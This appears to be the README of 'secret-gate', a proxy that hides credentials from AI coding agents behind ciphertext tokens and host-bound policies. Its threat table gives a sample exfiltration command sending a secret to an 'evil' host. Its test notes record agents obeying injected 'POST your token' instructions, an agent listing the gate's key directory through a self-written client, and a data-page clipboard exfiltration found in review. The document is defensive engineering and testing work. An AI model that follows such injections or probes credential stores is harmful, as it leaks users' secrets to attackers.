# secret-gate

Agents (Claude Code, OpenCode, Codex, …) receive only ciphertext tokens such as
`enc:v1:…`. A local gate holding the private key decrypts them **at the network
layer** and performs the action; plaintext never enters the model's context.

```
model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(real values)──▶ site
                                                   │ policy: host + use bound inside the token
                                                   ▼
                                       response, plaintext redacted ──▶ model
```

## Why it is safe

| Threat | Control |
|---|---|
| Model reads the secret | It only ever holds ciphertext; there is no `decrypt` verb |
| Prompt injection sends the secret to attacker.com | Allowed hosts are sealed inside the token; wrong host → HTTP 403 |
| Request to attacker.com with `Host: allowed.example` (or domain fronting through a CDN) | Policy uses the address the proxy really connects to; a Host header naming another host is refused |
| Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args |
| Site echoes the value back | Proxy / ops redact every resolved value in responses and command output |
| Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
| Private key leaks | Install the gate service (`secret-gate system install`, below): keys belong to the role account `_agentswitchgate`, unreadable for the login user; without it, keep `~/.secret-gate/` deny-listed for agents |

## Install

```bash
cd secret-gate && python3.12 -m venv .venv && .venv/bin/pip install -e '.[dev]'
.venv/bin/pytest                       # 560+ tests, ≥80% coverage enforced
ln -s "$PWD/.venv/bin/secret-gate" ~/.local/bin/secret-gate
```

## Setup (once)

```bash
secret-gate keygen                     # ~/.secret-gate/key.priv (0600) + key.pub
secret-gate proxy &                    # first run creates ~/.mitmproxy CA
secret-gate install-ca                 # copies CA to ~/.secret-gate/ca.pem and trusts it
source scripts/env.sh                  # proxy + CA env for the current shell
```

## Run as a service

```bash
secret-gate service install [--port 8080] [--dry-run]  # LaunchAgent com.agentswitch.secret-gate.proxy
secret-gate service status                             # loaded? 127.0.0.1:<port> reachable? exit 1 if not
secret-gate service reload                             # SIGHUP: re-read upstream-insecure.txt
secret-gate service uninstall                          # stop it and remove the plist; logs stay
```

`install` needs a keypair. It writes `~/Library/LaunchAgents/com.agentswitch.secret-gate.proxy.plist`
(mode 0644: paths and a port, no secret) and loads it with `launchctl bootstrap gui/<uid>`; launchd
starts the proxy at login and restarts it when it dies. The job runs `secret-gate proxy --port N` of
this installation, as you, listening on 127.0.0.1 only, with nothing but `SECRET_GATE_HOME` and a
minimal `PATH` in its environment (never proxy variables), umask 077, logs in
`~/.secret-gate/logs/proxy.{out,err}.log` (dir 0700, files 0600). `--dry-run` prints the plist and the
`launchctl` commands and changes nothing. `status` doubles as the health check for whoever dispatches
credential work: non-zero means the gate is not there. Stop any proxy you started by hand first, or
the service cannot bind its port (`install` warns, and never stops it for you).

**Reload.** On SIGHUP the proxy re-reads `upstream-insecure.txt` without dropping connections and
writes one line to stderr (`proxy.err.log`) with the new count and the hosts added or removed. A file
it cannot trust (unreadable, not UTF-8, over 64 KiB, group/world-writable, or a line that is not
`host`, `host:port` or `*.suffix`) keeps the previous list and says why; a deleted file means no
exceptions. Nothing is ever added automatically. A proxy started by hand reloads with `kill -HUP <pid>`.

**After updating secret-gate, restart the proxy** (`secret-gate service install` again, or stop and
start a hand-started one), not just `reload`. mitmdump hot-reloads `mitm_entry.py` when that file
changes but keeps the old `secret_gate` modules loaded; a reload that fails on the mix leaves the
proxy running as a plain mitmproxy without the gate (tokens are then forwarded as ciphertext and
the `upstream-insecure.txt` exceptions are gone). `secret-gate bootstrap <harness>` checks that the
listener really is the gate.

The service runs as your user: it keeps the gate up and on loopback, but a harness running as the same
user can still read `~/.secret-gate`. The gate service below runs it under a separate account.

## Gate service (`secret-gate system`, docs/gate-service-v0.md)

The isolated setup the Mac app installs: the proxy and a local rpc server run as the macOS role account
`_agentswitchgate` (no password, no login, UID/GID in 450–499) from LaunchDaemons, and everything secret is
theirs. The login user's processes (daemon, executors, their shells, the browser component) cannot read it.

```
/Library/Application Support/AgentSwitch/          root:wheel 0755
  gate/            _agentswitchgate 0700   SECRET_GATE_HOME and HOME of both services: keys/ (keys/legacy/),
                                           current, refs.sqlite3, logs/{proxy,rpc}.log, logs/rpc-audit.jsonl,
                                           mitmproxy/ (CA + key), exec_templates.json, upstream-insecure.txt,
                                           screenshot-mask.json; dirs 0700, files 0600
  gate-public/     _agentswitchgate 0755   keys.json (0644), ca.pem (0644), gate.sock (0666, peer-uid checked)
  runtime/         root:wheel               python/ + secret-gate/ copied from the App bundle, VERSIONS,
                                           bin/secret-gate (wrapper → python/bin/secret-gate)
  gate-service.json root:wheel 0644         {"ownerUid", "proxyPort", "runtimeVersion", "installedAt"}
/Library/LaunchDaemons/com.agentswitch.gate.{rpc,proxy}.plist   root:wheel 0644
```

The services run `runtime/bin/secret-gate rpc` and `runtime/bin/secret-gate proxy --port N --confdir
<root>/gate/mitmproxy`, never the App bundle's copy (the bundle is writable by the login user). Environment:
`SECRET_GATE_HOME=HOME=<root>/gate`, `SECRET_GATE_PUBLIC=<root>/gate-public`, a PATH of root-owned
directories; `Umask 077`, `RunAtLoad`, `KeepAlive`; output to `gate/logs/{proxy,rpc}.log`.

```bash
# root (the Mac app asks for an administrator once)
secret-gate system install --owner-uid $(id -u) --port 8080 \
    --runtime /path/AgentSwitch.app/Contents/Resources/runtime --migrate-from ~/.secret-gate [--dry-run]
secret-gate system update --runtime …/runtime [--port N] [--dry-run]    # swap runtime/, restart; data stays
secret-gate system uninstall [--delete-keys] [--dry-run]                # keys and the account stay by default
# anyone
secret-gate system status [--json]
```

`install` creates the account (`dseditgroup`, `sysadminctl -addUser _agentswitchgate … -roleAccount`),
the directories, the runtime copy and gate-service.json; migrates the old home: every keypair becomes a
**legacy** keypair (decrypt only, never current again; `keys retire <name>` deletes one), a new keypair `main`
becomes current, `refs.sqlite3`, the three trusted config files and old logs move in; generates a new
mitmproxy CA in `gate/mitmproxy/` and publishes `ca.pem`; writes and bootstraps both LaunchDaemons and
waits until `status` reports the proxy running and the migrated keys. Only then are the originals deleted
(each only where an identical copy is in the service), the old CA private key in `~/.mitmproxy` removed and
`~/.secret-gate/MOVED.txt` written. Any failing step stops the run and lists what was done and what was not;
nothing is rolled back. Root touches the login user's directories only through `O_NOFOLLOW` directory
descriptors. Stop a gate the Mac app started itself before installing: the service's proxy needs the port.
`--root <prefix>` moves every system path under a prefix and only lists the privileged commands (tests).

`status --json` → `{"installed", "running", "rpcRunning", "proxyRunning", "proxyPort", "runtimeVersion",
"ownerUid", "publicDir", "bundledRuntimeVersion", "updateAvailable", "error"}` (always exit 0; `running` means
rpc answered and the proxy is up; `updateAvailable` compares with the runtime this CLI belongs to, or
`--runtime`). `runtimeVersion` is `<secret-gate version>+<built>` from the runtime's `VERSIONS`.

**`gate.sock`** (`secret-gate rpc`): one JSON object per line, `{"id", "method", "params"}` →
`{"id", "ok": true, "result"}` or `{"id", "ok": false, "error"}`, requests ≤ 1 MiB, one thread per
connection. Only root and `ownerUid` are let in (the kernel's peer uid). Methods: `status`, `keys.list`,
`keys.new {name, use?}`, `keys.use {name}`, `keys.retire {name}`, `refs.register {scope, tokens}`,
`refs.release {scope}`, `credential.info {token}`, `credential.reissue {token, host, purpose}`,
`mcp.describe|otp {scope?, token}`, `mcp.http {scope?, method, url, headers?, body?}`,
`mcp.exec {scope?, template, token, args?}`, `mcp.repair {scope?, token, host, purpose?, repairUrl?, repairKey?}`,
`browser.resolve {scope?, token, host}` (use `fill` only, `host` = the page's `host:port`),
`browser.register {scope, token}`, `browser.config`, `logs.tail {name: proxy|rpc, lines ≤ 500}`. Every call
is audited in `gate/logs/rpc-audit.jsonl` (no values). After a key change the service rewrites `keys.json`
and sends SIGHUP to the proxy (pid from `gate/proxy.pid`), which reloads every key.

**Service mode of the CLI.** When `$SECRET_GATE_PUBLIC/gate.sock` (default `<root>/gate-public/gate.sock`)
exists and belongs to another user, the CLI is the service's client, with unchanged output: `keys [--json]`,
`pubkey` and `enc` read `keys.json`; `keys new|use|retire`, `refs register|release`, `credential-info|reissue`
go over the socket; `mcp` forwards every tool call to `mcp.*` with this process's `SECRET_GATE_SCOPE` and
repair bridge; `browser` still runs Playwright as you but types values from `browser.resolve`, registers
sealed page data with `browser.register`, takes the mask config from `browser.config` and keeps the
downstream's output in a temporary directory of yours; `bootstrap` checks `keys.json` and the published
`ca.pem`. `keygen`, `check`, `proxy`, `service`, `install-ca` and `rpc` are refused ("凭据网关由系统服务管理，
请在 Mac 应用里操作。"). A service that does not answer is an error ("凭据网关服务无响应"), never a fallback
to a local gate. Without `gate.sock` everything behaves as before.

### Check a harness and print its config

```bash
secret-gate bootstrap claude-code                      # or codex / opencode; --port N
secret-gate bootstrap codex --write ./codex-gate.toml  # that file only, only if every check passed
```

Checks: the keypair loads; `~/.secret-gate/ca.pem` is a valid certificate and the same CA the proxy
signs with; something listens on 127.0.0.1:<port>; and that listener is the gate (a loopback-only
probe the gate refuses with `403 X-Secret-Gate: denied`, which a stray web server or a bare mitmproxy
does not). The snippet from `config/`, with your paths and port filled in, goes to stdout; the checks,
what applying the snippet would change (e.g. Codex's `network_access = true` lets every sandboxed
command open sockets) and where it goes, to stderr. Non-zero exit when a check fails. It installs
nothing, never writes `~/.claude/settings.json`, `~/.claude.json`, `$CODEX_HOME/config.toml` or
OpenCode's global config (not even with `--write … --force`), and never touches the keychain: CA trust
travels as `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` in the snippet, for that
harness only. (`secret-gate install-ca`, by contrast, trusts the CA in the login keychain for every
app of this user.)

## Named keypairs

```bash
secret-gate keys                         # list; * marks the current one
secret-gate keys new work --use          # create and make current
secret-gate keys new home                # create without switching
secret-gate keys use home                # switch: new tokens are minted for "home"
```

Keypairs live in `<home>/keys/<name>/`; a legacy `<home>/key.priv` is listed as `default`.
The proxy and MCP server decrypt with **every** keypair present, so switching never breaks
tokens minted earlier. A native macOS front end for all of this is in `packages/secret-gate-ui`.

Keypairs in `<home>/keys/legacy/<name>/` (what the gate service's install makes of an old home) only
decrypt: `keys use` refuses them, `keys retire <name>` deletes one (its tokens stop working; the current
keypair cannot be retired). `keys --json` rows are `{"name", "public", "current", "legacy"}`.

## Encrypt a secret

```bash
secret-gate enc --label portal-a/pass --host portal-a.example.com --host login.portal-a.example.com
# prompts for the value (never echoed) and prints: enc:v1:...
secret-gate enc --label portal-a/totp --kind totp --host portal-a.example.com --use http --use otp
secret-gate enc --label db/pass --use exec
secret-gate check enc:v1:...           # label / kind / hosts / uses — never the value
# batch: values never touch argv
echo '[{"label":"a/pass","hosts":["a.example.com"],"value":"..."},
       {"label":"a/totp","kind":"totp","uses":["otp"],"value":"BASE32"}]' | secret-gate enc --batch
```

Hosts may carry a port: `--host 10.0.0.5:8001` allows only that port, while `--host 10.0.0.5`
allows every port. Use the former when one hostname serves several sites on different ports,
otherwise a password for one of them would be accepted by all of them.

Give the token to the agent as if it were the password. Uses: `http` (proxy, `secret_http` and
browser fills), `fill` (browser fills only: the proxy and `secret_http` refuse it), `otp`
(`secret_otp`), `exec` (`secret_exec` with `exec_templates.json`).

## Short references (`enc:ref:`)

A 270-character token gets damaged when a model retypes it. A dispatcher (the AgentSwitch daemon)
can instead hand each execution 24-character references to the tokens it may use:

```bash
echo '{"scope":"<32 random chars>","tokens":["enc:v1:..."]}' | secret-gate refs register
# {"refs":[{"ref":"enc:ref:Xq3...","label":"portal-a/pass","kind":"secret","hosts":[...],"uses":["http"]}]}
echo '{"scope":"<same>"}' | secret-gate refs release        # {"released": 1}
```

- A reference is only a pointer: the ciphertext behind it keeps its hosts and uses, and every
  entry point (proxy, `secret_http`, `secret_exec`, `secret_otp`, `secret_describe`, `secret_fill`,
  `secret_repair`) checks it exactly as if the token had been given.
- It resolves only inside its **execution scope**: the gate MCP and browser gate get
  `SECRET_GATE_SCOPE`, shell tools a proxy URL `http://scope:<scope>@127.0.0.1:8080` (sent as
  `Proxy-Authorization`, stripped before the request leaves). No scope, another task's scope or a
  released scope: refused (`403 X-Secret-Gate: denied` on the proxy).
- The scope goes over stdin, never argv. The registry (`refs.sqlite3`, 0600) holds ciphertext,
  labels and scope hashes only. Releasing drops the mappings and closes the scope for good; it does
  **not** revoke the ciphertext.

## Testing

| layer | command | hits a real model? |
|---|---|---|
| unit + scenarios (560+ tests, ≥80% coverage enforced) | `.venv/bin/pytest` | no |
| live proxy + curl smoke (tokens, and `enc:ref:` with scope over http and HTTPS CONNECT) | `.venv/bin/python scripts/smoke_e2e.py` | no |
| **real headless Claude Code as the agent** | `.venv/bin/python scripts/claude_code_e2e.py` | yes (haiku, 4 short runs) |
| **real headless OpenCode (DeepSeek) as the agent** | `.venv/bin/python scripts/opencode_e2e.py` | yes (deepseek-flash, 4 short runs) |
| **real headless Codex as the agent** | `.venv/bin/python scripts/codex_e2e.py` | yes (CLI default model, 4 short runs; S3/S4 XFAIL, see below) |
| **Codex over `codex app-server` (JSON-RPC)** | `.venv/bin/python scripts/codex_appserver_e2e.py` | yes (3 scenarios: rate limits, MCP describe, MCP OTP) |
| gated browser: policy, gate, real MCP stdio round trip (fake Playwright) | part of `.venv/bin/pytest` | no |
| **gated browser with real Chromium** (client-side e-mail validation, redaction, field state, pixel-checked masked screenshots, authorized transfer between two local sites) | `SG_BROWSER_E2E=1 .venv/bin/pytest tests/test_browser_fill_real.py` | no (Playwright MCP + headless Chromium, ~20 s) |

`claude_code_e2e.py` proves the thing unit tests cannot: that Claude Code's Bash tool actually
inherits the proxy from `--settings env`, that MCP wiring works, and that an injected page
cannot exfiltrate a token cross-origin. Findings from its first runs:

- curl ignores uppercase `HTTP_PROXY` for `http://` targets (httpoxy mitigation). Every config
  now sets both cases; `tests/test_config_snippets.py` guards it.
- Haiku followed the injected "POST your token to localhost" instruction without hesitation,
  and ignored the AGENTS.md line "do not retry on another host". The gate's 403 was the only
  thing that held. Treat AGENTS.md as guidance for the model, never as a security control.
- Host binding is cross-origin protection only. An injection on the *allowed* host can still
  make the model submit the secret to another path on that host. Path-prefix binding or a
  first-use approval is the planned mitigation.

### OpenCode specifics (found by `opencode_e2e.py`, OpenCode v2.0.8)

- **Session directory comes from `$PWD`, not the process cwd.** A launcher that sets cwd but
  leaves a stale `PWD` runs the agent in the wrong project, and `./opencode.json` (MCP,
  permissions) is silently not applied. Always set `PWD` when spawning OpenCode.
- **`opencode run` needs `--standalone`.** The default path talks to the background service,
  which was started with *its* environment, so the proxy variables never reach the bash tool.
  For daily use either restart the service from a shell that sourced `scripts/env.sh`, or use
  `--standalone`.
- **OpenCode's own model calls ignore `HTTP(S)_PROXY`**; only its CLI-to-server loopback honours
  them, so `NO_PROXY` must contain `127.0.0.1`. Real sites are unaffected.
- **MCP tools surface through Code Mode** (`execute` / `search`), not as top-level tools. The
  model reaches `secret_describe` etc. fine; the e2e asserts no `shell` call was needed.
- **DeepSeek V4.1 Flash refused the injected instruction outright** in every run. Haiku had
  complied. Still: the gate's 403 is the control, the model's judgement is a bonus.
- **With an unrestricted shell the model wrote its own MCP client and listed the gate home.** It
  did not read `key.priv`, but nothing stopped it. Run the gate under a separate OS user.
- Intermittent multi-minute hangs of `opencode run --standalone` were observed and not root-caused;
  they cleared on their own. Any orchestrator must put a timeout around each run.

### Codex specifics (found by `codex_e2e.py`, codex-cli 0.142.3 and 0.155.0)

- **Codex's own API traffic honours `HTTP(S)_PROXY` from the process env** (a websocket to
  chatgpt.com), the opposite of OpenCode. Never put proxy variables in Codex's process env; put
  them in `[shell_environment_policy] set`, which reaches the shell tool only. `set` is applied
  after the default KEY/SECRET/TOKEN exclusion, so `SECRET_GATE_HOME` survives there.
- **The workspace-write sandbox blocks sockets** until `[sandbox_workspace_write] network_access = true`.
- **`codex exec` reads stdin when it is a pipe**: spawn it with stdin closed or it waits forever.
- **`codex exec` cancels every MCP tool call** ("user cancelled MCP tool call",
  [openai/codex#24135](https://github.com/openai/codex/issues/24135)). `approval_policy = "never"`,
  `alwaysAllow`, `autoApprove` do nothing; the only workaround is
  `--dangerously-bypass-approvals-and-sandbox`, which this project refuses. The proxy path (S1/S2)
  is unaffected. AgentSwitch drives Codex over `codex app-server`, where the approval request can be
  answered programmatically; until then S3/S4 report XFAIL on Codex.
- **Codex always submits forms with `curl --data-urlencode`**, so the token arrives as
  `enc%3Av1%3A…`. The gate now recognises the URL-encoded form, substitutes the URL-encoded
  plaintext and redacts both spellings (`tests/test_urlencoded_tokens.py`). Before this fix every
  browser-style form submission would have silently bypassed the gate.
- Codex refused the injected instruction on the proxy path and reported the gate's 403 correctly.

### Codex over app-server (found by `codex_appserver_e2e.py`, codex 0.155.0)

This is the path AgentSwitch's Codex executor will use; the script is its skeleton.

- Framing is newline-delimited JSON-RPC 2.0 on stdio. Handshake: `initialize` with
  `{clientInfo: {name, version}}`, then the `initialized` notification.
- `thread/start {cwd, sandbox: "workspace-write", approvalPolicy: "on-request", ephemeral: true}`
  → `turn/start {threadId, input: [{type: "text", text}]}` → wait for the `turn/completed`
  notification; `item/completed` carries `agentMessage` (field `text`) and `mcpToolCall`
  (`server`, `tool`, `status`, `arguments`) items.
- **The MCP tool approval arrives as the server->client request `mcpServer/elicitation/request`**
  with `_meta.codex_approval_kind = "mcp_tool_call"`, `_meta.tool_params` (the token, i.e. only
  ciphertext), a human message ("Allow the secret-gate MCP server to run tool …?") and
  `_meta.persist = ["session", "always"]`. Answer `{action: "accept", content: {}}` and the call
  runs. This is the exact payload the phone's approval card will render.
- `account/rateLimits/read` returns `rateLimits.primary/secondary` with `usedPercent`,
  `windowDurationMins`, `resetsAt`: the Codex source for the quota panel, no model call needed.
- Both `codex exec`'s MCP limitation and the proxy-variable rule above still apply: the app-server
  process must not see `HTTP(S)_PROXY`; the shell tool gets them from `shell_environment_policy`.


## Real-site demo from Claude Code (browser through the gate)

```bash
secret-gate proxy &                                   # gate on :8080
secret-gate enc --label site/pass --host site.example.com --host login.site.example.com
secret-gate enc --label site/totp --kind totp --use otp
scripts/browser_demo.sh https://site.example.com https://login.site.example.com
```

`browser_demo.sh` launches an interactive `claude` with two MCP servers: secret-gate and
Playwright MCP wrapped by `secret-gate browser` (see "Browser fill" below), configured with
`--proxy-server` = the gate, `--ignore-https-errors` (no CA install needed), a throw-away Chromium
profile and `--allowed-origins` limited to what you list. Claude Code hands the settings env,
proxy included, to MCP server processes as well; the gate strips it from the Playwright process
(npx would otherwise reach the npm registry through the gate and hang) and the version is pinned
with `--prefer-offline`.

Permissions: a global `permissions.defaultMode` of `dontAsk` in `~/.claude/settings.json` makes
an unqualified session silently deny every Playwright / secret-gate / Bash call. The demo forces
`--permission-mode default`, pre-allows `mcp__playwright`, `mcp__secret-gate` and `Bash(curl *)`,
and passes `--no-chrome` so the model cannot pick the un-proxied Chrome integration over the
gated Playwright browser. Anything else still prompts.

Type the `enc:v1:` token into the field (or call `secret_fill`); the gate puts the real value
into the page, so client-side validation and hashing see the real value, and the proxy still
covers curl / `secret_http`. Not for WebSocket logins, Passkey-only sites, or CAPTCHA walls.
Start with a low-value test account.

## Browser fill (`secret-gate browser`)

```bash
secret-gate browser -- npx -y @playwright/mcp@0.0.82 --proxy-server=http://127.0.0.1:8080 ...
```

An MCP stdio server that spawns another MCP server (the unmodified Playwright MCP) and gates it:

- `secret_fill(target, token, element?, submit?)`, and `browser_type` / `browser_fill_form` with a
  token as the text: the gate reads the live page URL (`### Result` of a `location.href` probe,
  nothing else is trusted), checks the token's host policy against `host:port` (same rules as the
  proxy, `http` use), and types the **real value** into the element. The model still only ever
  handles the token. Because the value is in the DOM, browser-side e-mail/length checks and JS
  hashing work.
- Every text result is redacted with every value filled in the session, in every encoding a
  browser produces (raw, `%xx`, `+`, JSON/JS-escaped, HTML entities). The `### Ran Playwright code`
  echo of a fill and Playwright's `- [Snapshot](...)` file links are dropped outright.
- Never advertised: `browser_evaluate`, `browser_run_code_unsafe`.
- Refused always: any `filename` argument (unredacted file), any `paths` argument (would upload
  Playwright's own output files), non-http(s) URLs in `browser_navigate` / `browser_tabs`
  (`data:` pages are model-authored JavaScript; `--allowed-origins` does not cover them).
- Refused once a value has been filled: copy/cut chords in `browser_press_key`, `regex` search,
  and any `text` / `textGone` / selector `target` sharing 4 consecutive characters with a filled
  value (substring oracles on echoed text).
- `browser_take_screenshot` is **masked**, not refused, once anything needs protecting. Right before
  the capture the gate takes its own (unredacted) snapshot and masks, by snapshot ref, every element
  showing a filled or sealed value or a personal-data pattern (e-mail, phone, ID number, card), plus
  every password input, every canvas on a page that held a value, and the admin regions in
  `screenshot-mask.json` (`{"kinds": [...], "regions": {"host[:port]": ["css", ...]}}`). It captures
  with Playwright's own `mask` through `browser_run_code_unsafe` (gate-internal, fixed templates),
  decodes the PNG itself and requires every masked box to be solid mask colour. Sensitive text with
  no element to mask, an uncovered box, an unreadable image: refused. The page is never told what is
  protected and its DOM and form values are not changed.
- `secret_field_state(target)` and the result of `secret_fill` report the field's current state
  (`empty` / `nonempty` / `unknown`, read in Playwright's isolated world; the value never comes
  back) separately from the gate's history (`attempted` / `filled` on this page).
- Authorized field transfer: with `SECRET_GATE_TRANSFER`
  (`{"source": [...], "destination": [...], "fields": ["email", "phone", "id_number", "bank_card"], "purpose": "..."}`,
  exact hosts only, applied only together with a scope), values of those kinds in output from a
  source page are encrypted on the spot into tokens allowed only on the destination, registered as
  references, and shown to the model as references with a legend. `secret_fill` places them on the
  destination; the gate also refuses when the field's form (or `formaction`) submits elsewhere.
  Sealed values get the same protection as filled ones (redaction, oracles, copy chords, masks).
- Decisions (fills, seals, screenshots, refusals and their reasons) go to
  `$SECRET_GATE_HOME/logs/browser-audit.jsonl` (0600): hosts, labels and references only.
- Fail closed: no page URL, a non-http page, or a wrong host means nothing is typed.
- `BOUNDARY.md` lists every entry point with its rule, failure behaviour and guarding tests, and the
  known gaps (content that changes between snapshot and capture, closed Shadow DOM, cross-origin
  frames missing from the snapshot, fields no pattern recognizes).
- The downstream runs with the parent env minus proxy variables, the repair bridge, the scope and
  the transfer grant (its browser gets the proxy from `--proxy-server`), with cwd and `--output-dir` in `$SECRET_GATE_HOME/browser-out` (0700), and
  every file it persists there (unredacted page snapshots, console and network logs) is deleted
  after each call.

Verified against real Playwright MCP 0.0.82 by an adversarial review: a `data:` page plus
`Meta+c`/`Meta+v` exfiltrated a filled value base64-encoded, and `browser_file_upload` could feed
`page-*.yml` to such a page. Both are closed by the rules above. Remaining: a headed browser puts
whatever the user copies on the OS clipboard as usual, and the gate under a separate macOS user is
still the control that keeps the private key and `browser-out` away from the harness.

## Wire an agent

| Agent | Tool env | MCP | Instructions |
|---|---|---|---|
| Claude Code | `config/claude-code.settings.snippet.json` → `~/.claude/settings.json` (or `claude --settings <file>`) | `claude mcp add secret-gate -- ~/.local/bin/secret-gate mcp` | `CLAUDE.md` → `@AGENTS.md` |
| OpenCode | `source scripts/env.sh` before launch | `config/opencode.snippet.json` | `AGENTS.md` |
| Codex | `config/codex.config.snippet.toml` (`shell_environment_policy`, enables sandbox network) | same file | `AGENTS.md` |

`secret-gate bootstrap <claude-code|codex|opencode>` prints these snippets with your paths and port
filled in, after checking the gate (see "Run as a service"). Copy `AGENTS.md` into any project the
agents work in.

## Layout

```
secret_gate/
  constants.py   errors.py      policy.py      crypto.py      tokens.py
  otp.py         keystore.py    resolver.py    redact.py      exec_templates.py
  gate_ops.py    proxy_addon.py mitm_entry.py  mcp_server.py  cli.py
  upstream_tls.py reload.py     service.py     bootstrap.py   harness_config.py  proxy_probe.py
  refs.py        refs_cli.py    credential_repair.py           audit.py
  browser_mcp.py browser_gate.py browser_policy.py browser_probe.py browser_mask.py
  pii.py         transfer.py
  service_paths.py publish.py   proxy_pid.py   rpc_protocol.py rpc_server.py rpc_methods.py rpc_client.py
  service_cli.py mcp_backend.py remote_resolver.py enc_cli.py
  system_plan.py system_ops.py  system_exec.py system_cli.py migrate.py  user_dir.py   (gate service, docs/gate-service-v0.md)
tests/           unit tests per module + test_scenarios.py (12 end-to-end cases)
BOUNDARY.md      entry-point checklist (docs/gate-next-v0.md §4), checked by tests/test_boundary_checklist.py
tests/fixtures/  fabricated credentials / PII used by the suite (nothing real)
config/          per-agent snippets, exec template example
scripts/env.sh   proxy + CA environment
```

## Sloppy upstream headers (HTTP/2 is off)

The proxy talks HTTP/1.1 to every site. mitmproxy's HTTP/2 stack treats a header value with
leading or trailing whitespace (`Server: nginx `, which some nginx builds send) as a protocol
error and answers `502 Bad Gateway: HTTP/2 protocol error: Received header value surrounded by
whitespace`. HTTP/1.1 parsing tolerates it, nothing the gate does needs h2, so `secret-gate proxy`
starts mitmdump with `--set http2=false`. Header validation itself stays on.

## Self-signed internal sites

The proxy verifies upstream certificates like a browser would. A site with a self-signed
certificate answers with `502 Bad Gateway: certificate verify failed: self-signed certificate in
certificate chain`, and nothing the model does can fix that. List such hosts, one per line, in
`~/.secret-gate/upstream-insecure.txt` (with the gate service: `<root>/gate/upstream-insecure.txt`, which
needs an administrator; the Mac app does it) (`host`, `host:port`, or `*.suffix`; `#` comments) and
reload the proxy (`secret-gate service reload`, see "Run as a service", or restart it): for those hosts alone the upstream certificate is accepted unverified (a warning
is logged once per host); every other host stays strictly verified. Only do this for hosts you
reach over a network you trust (LAN, Tailscale): an attacker on the path to an unverified host
could impersonate it and receive the substituted secret.

## Limits

- Sites that hash the password in browser JS or validate the field format: the proxy cannot
  see a placeholder there. Use `secret_fill` (browser section above). WebSocket/gRPC logins and
  request signing outside the browser: a template under `secret_exec`.
- Responses are redacted by exact value match; a site that returns a transformed value
  (e.g. masked) is not detected, which is fine.
